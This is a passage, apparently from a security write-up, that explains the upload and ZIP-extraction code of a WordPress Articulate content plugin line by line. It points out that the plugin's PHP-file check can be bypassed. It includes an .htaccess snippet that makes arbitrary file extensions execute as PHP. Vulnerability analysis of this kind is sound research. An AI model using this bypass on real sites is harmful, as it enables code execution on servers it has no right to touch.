&lt;code&gt;action=articulate_upload_file&lt;/code&gt;, the callback &lt;code&gt;articulate_upload_ajax_file&lt;/code&gt; is invoked&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_upload_ajax_file() {&#xA;&#x9;articulate_setup_php_ini();&#xA;&#x9;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&#xA;&#xA;&#x9;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __( &amp;#39;You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$count_dirs = getDirs();&#xA;&#x9;// you can use WP&amp;#39;s wp_handle_upload() function:&#xA;&#x9;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;&#x9;$dir  = untrailingslashit( getUploadsPath() );&#xA;&#xA;&#x9;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to move uploaded file.  Please check if the folder has write permissions.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;&#x9;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;&#x9;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;&#x9;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&#xA;&#x9;// Open temp file&#xA;&#x9;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;&#x9;if ( $out ) {&#xA;&#x9;&#x9;// Read binary input stream and append it to temp file&#xA;&#x9;&#x9;$in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;&#x9;&#x9;if ( $in ) {&#xA;&#x9;&#x9;&#x9;while ( $buff = fread( $in, 4096 ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;fwrite( $out, $buff );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open input stream. Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;@fclose( $in );&#xA;&#x9;&#x9;@fclose( $out );&#xA;&#x9;&#x9;@unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open output stream.  Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Security check.&#xA;&#x9;$mime  = wp_check_filetype( $filePath );&#xA;&#x9;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;&#x9;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Check if file has been uploaded&#xA;&#x9;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;&#x9;&#x9;// Strip the temp .part suffix off&#xA;&#x9;&#x9;articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;&#x9;&#x9;// start extracting&#xA;&#x9;&#x9;// unzip file&#xA;&#x9;&#x9;$dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;&#x9;&#x9;$dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;&#x9;&#x9;$target = getUploadsPath() . $dir[0];&#xA;&#x9;&#x9;$file   = $filePath;&#xA;&#x9;&#x9;while ( file_exists( $target ) ) {&#xA;&#x9;&#x9;&#x9;$r       = rand( 1, 10 );&#xA;&#x9;&#x9;&#x9;$target .= $r;&#xA;&#x9;&#x9;&#x9;$dir[0] .= $r;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$arr = extractZip( $file, $target, $dir[0] );&#xA;&#x9;&#x9;unlink( $filePath );&#xA;&#x9;&#x9;do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;&#x9;&#x9;$ok       = isset( $arr[4] ) ? $arr[4] : 0;&#xA;&#x9;&#x9;$response = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;     =&amp;gt; $ok,&#xA;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39;   =&amp;gt; $arr[0],&#xA;&#x9;&#x9;&#x9;&amp;#39;folder&amp;#39; =&amp;gt; $arr[2],&#xA;&#x9;&#x9;&#x9;&amp;#39;path&amp;#39;   =&amp;gt; $arr[1],&#xA;&#x9;&#x9;&#x9;&amp;#39;name&amp;#39;   =&amp;gt; $arr[3],&#xA;&#x9;&#x9;&#x9;&amp;#39;target&amp;#39; =&amp;gt; $target,&#xA;&#x9;&#x9;);&#xA;&#x9;&#x9;die( json_encode( $response ) );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 1,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Uploading chunks!&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;exit;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;articulate_upload_ajax_file()&lt;/code&gt; function handles AJAX file uploads for the plugin. Specifically:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Initialization &amp;amp; basic security&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;articulate_setup_php_ini();&#xA;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_setup_php_ini()&lt;/code&gt; — adjusts PHP settings (usually to allow larger uploads, longer timeouts, etc.).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer()&lt;/code&gt; — checks the nonce to prevent CSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;User capability checks&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Only logged-in users with &lt;code&gt;upload_files&lt;/code&gt; and &lt;code&gt;unfiltered_html&lt;/code&gt; capabilities can upload (Editor and above).&lt;/li&gt;&#xA;&lt;li&gt;If lacking permission, returns JSON error and exits.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Retrieve file info and storage path&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$count_dirs = getDirs();&#xA;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;$dir  = untrailingslashit( getUploadsPath() );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$_FILES[&#39;async-upload&#39;]&lt;/code&gt; is the uploaded file from client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getUploadsPath()&lt;/code&gt; returns the plugin&amp;rsquo;s base upload directory; &lt;code&gt;untrailingslashit()&lt;/code&gt; removes trailing &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Initial upload error check&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If no file or upload error code present, return error.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Handle chunked upload and filename&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Supports chunked uploads. &lt;code&gt;chunk&lt;/code&gt; is current index, &lt;code&gt;chunks&lt;/code&gt; total parts.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt; sanitizes filename to remove dangerous characters.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filePath&lt;/code&gt; is the destination path in the plugin upload directory.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Open &lt;code&gt;.part&lt;/code&gt; and write data (append or write)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;if ( $out ) {&#xA;    $in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;    if ( $in ) {&#xA;        while ( $buff = fread( $in, 4096 ) ) {&#xA;            fwrite( $out, $buff );&#xA;        }&#xA;    } else { die(...); }&#xA;    @fclose( $in );&#xA;    @fclose( $out );&#xA;    @unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;} else { die(...); }&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Opens temporary file &lt;code&gt;{$filePath}.part&lt;/code&gt;: if &lt;code&gt;chunk == 0&lt;/code&gt; open for write (&lt;code&gt;wb&lt;/code&gt;), otherwise append (&lt;code&gt;ab&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Reads PHP tmp file (&lt;code&gt;tmp_name&lt;/code&gt;) and writes to &lt;code&gt;.part&lt;/code&gt; in 4096-byte blocks.&lt;/li&gt;&#xA;&lt;li&gt;After writing, closes files and deletes PHP temp file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;MIME/type check based on file extension&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$mime  = wp_check_filetype( $filePath );&#xA;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_check_filetype( $filePath )&lt;/code&gt; returns MIME based on filename/extension (does not inspect binary content).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;get_allowed_mime_types( $user_id )&lt;/code&gt; returns allowed MIME types for the current user.&lt;/li&gt;&#xA;&lt;li&gt;If MIME not allowed, return security error.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;When all chunks are uploaded (finished)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;    articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;    $dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;    $dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;    $target = getUploadsPath() . $dir[0];&#xA;    $file   = $filePath;&#xA;    while ( file_exists( $target ) ) {&#xA;        $r       = rand( 1, 10 );&#xA;        $target .= $r;&#xA;        $dir[0] .= $r;&#xA;    }&#xA;    $arr = extractZip( $file, $target, $dir[0] );&#xA;    unlink( $filePath );&#xA;    do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;    ...&#xA;    die( json_encode( $response ) );&#xA;} else {&#xA;    die(json_encode([&amp;#39;OK&amp;#39;=&amp;gt;1,&amp;#39;info&amp;#39;=&amp;gt;&amp;#39;Uploading chunks!&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If not using chunking or current chunk is the last chunk:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_custom_rename()&lt;/code&gt; renames &lt;code&gt;.part&lt;/code&gt; → actual file.&lt;/li&gt;&#xA;&lt;li&gt;Prepare &lt;code&gt;target&lt;/code&gt; (folder) from filename (part before &lt;code&gt;.&lt;/code&gt;) — used as extraction directory.&lt;/li&gt;&#xA;&lt;li&gt;If &lt;code&gt;target&lt;/code&gt; exists, append random digits to avoid overwrite.&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;extractZip( $file, $target, $dir[0] )&lt;/code&gt; to extract the zip into &lt;code&gt;target&lt;/code&gt;. (This function likely handles ZIP; plugin-dependent logic.)&lt;/li&gt;&#xA;&lt;li&gt;Delete original zip via &lt;code&gt;unlink( $filePath )&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trigger hook &lt;code&gt;iea/uploaded_quiz&lt;/code&gt; for plugin/third-party processing.&lt;/li&gt;&#xA;&lt;li&gt;Return JSON response with info (OK, folder, path, name, target).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If still uploading chunks, return JSON notifying upload in progress.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;function extractZip( $fileName, $target, $dir ) {&#xA;&#x9;add_filter( &amp;#39;admin_memory_limit&amp;#39;, &amp;#39;articulate_run_admin_memory_limit_hook&amp;#39;, 100, 1 );&#xA;&#x9;// admin_memory_limit hook is called in wp_raise_memory_limit function that is called in unzip_file function.&#xA;&#x9;$arr      = array();&#xA;&#x9;$unzipper = new Quiz_Unzip( true );&#xA;&#x9;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&#xA;&#xA;&#x9;if ( $unzip ) {&#xA;&#x9;&#x9;wp_ajax_quiz_check_folder( $target );&#xA;&#x9;&#x9;if ( articulate_has_php_file( $target ) ) {&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we found a PHP file that is not allowed in your content directory. Contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;$arr[1] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;} else {&#xA;&#xA;&#x9;&#x9;&#x9;$file   = getFile( $target, true );// true to get return value as an array of detail&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;Upload Complete!&amp;#39;;&#xA;&#x9;&#x9;&#x9;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;index_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;other_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = __( &amp;#39;Upload Complete!&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 1;// OK = 1&#xA;&#x9;&#x9;&#x9;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:black&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we were unable to find an HTML file. Either increase your WP_MEMORY_LIMIT, define your FS_METHOD as DIRECT, or contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = $file;&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;$arr[0] = __( &amp;#39;File upload failed&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;}&#xA;&#x9;return $arr;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;extractZip()&lt;/code&gt; function handles &lt;strong&gt;unpacking the uploaded ZIP file&lt;/strong&gt; and also performs &lt;strong&gt;safety checks&lt;/strong&gt; (specifically to detect .php, .phtml, .phar), returning the result information as an array &lt;code&gt;$arr&lt;/code&gt;. Specifically:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Perform unzip&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unzipper = new Quiz_Unzip( true );&#xA;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Instantiate &lt;code&gt;Quiz_Unzip&lt;/code&gt; (likely a wrapper around WordPress&amp;rsquo;s &lt;code&gt;unzip_file()&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Extract &lt;code&gt;$fileName&lt;/code&gt; into &lt;code&gt;$target&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$unzip&lt;/code&gt; returns &lt;strong&gt;true&lt;/strong&gt; on successful extraction.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Check for dangerous PHP files&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( articulate_has_php_file( $target ) ) {&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;articulate_has_php_file()&lt;/code&gt; to &lt;strong&gt;scan the whole extracted directory&lt;/strong&gt; for files with &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_has_php_file( $dir ) {&#xA;    $dir = rtrim( $dir, &amp;#39;/&amp;#39; );&#xA;    if ( is_dir( $dir ) ) {&#xA;&#xA;        $dir_handle = opendir( $dir );&#xA;        if ( $dir_handle ) {&#xA;            while ( $file = readdir( $dir_handle ) ) {&#xA;                if ( $file != &amp;#39;.&amp;#39; &amp;amp;&amp;amp; $file != &amp;#39;..&amp;#39; ) {&#xA;                    if ( !is_dir( $dir . &amp;#39;/&amp;#39; . $file ) &amp;amp;&amp;amp;&#xA;                        (strpos($file, &amp;#39;.phtml&amp;#39;) !== false ||&#xA;                         strpos($file, &amp;#39;.php&amp;#39;) !== false &amp;amp;&amp;amp; $file != &amp;#39;relay.php&amp;#39; ||&#xA;                         strpos($file, &amp;#39;.phar&amp;#39;) !== false) ) { // Added condition for .phar files&#xA;                        return true;&#xA;                    } else {&#xA;                        $found = articulate_has_php_file( $dir . &amp;#39;/&amp;#39; . $file );&#xA;                        if ( $found ) {&#xA;                            return true;&#xA;                        }&#xA;                    }&#xA;                }&#xA;            }&#xA;            closedir( $dir_handle );&#xA;        }&#xA;&#xA;        return false;&#xA;    }&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Besides &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt; an attacker can use &lt;code&gt;.htaccess&lt;/code&gt; to override handling in the uploads directory; as a result, subsequently uploaded files with arbitrary extensions chosen by the attacker (e.g., &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) can be executed as PHP.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;   &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;       SetHandler application/x-httpd-php&#xA;   &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;If a dangerous file is found:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;ZIP upload successful, but we found a PHP file...&amp;lt;/span&amp;gt;&amp;#39;;&#xA;articulate_rrmdir( $target ); // Remove the entire directory&#xA;$arr[4] = 0;&#xA;$arr[1] = &amp;#39;&amp;#39;;&#xA;$arr[2] = $dir;&#xA;$arr[3] = &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Report error to the user.&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;articulate_rrmdir()&lt;/code&gt; to &lt;strong&gt;remove the entire extracted directory&lt;/strong&gt; (to remove malicious files).&lt;/li&gt;&#xA;&lt;li&gt;Set &lt;code&gt;OK = 0&lt;/code&gt; (failure).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;If NO dangerous PHP file is found:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file = getFile( $target, true ); // Retrieve main file 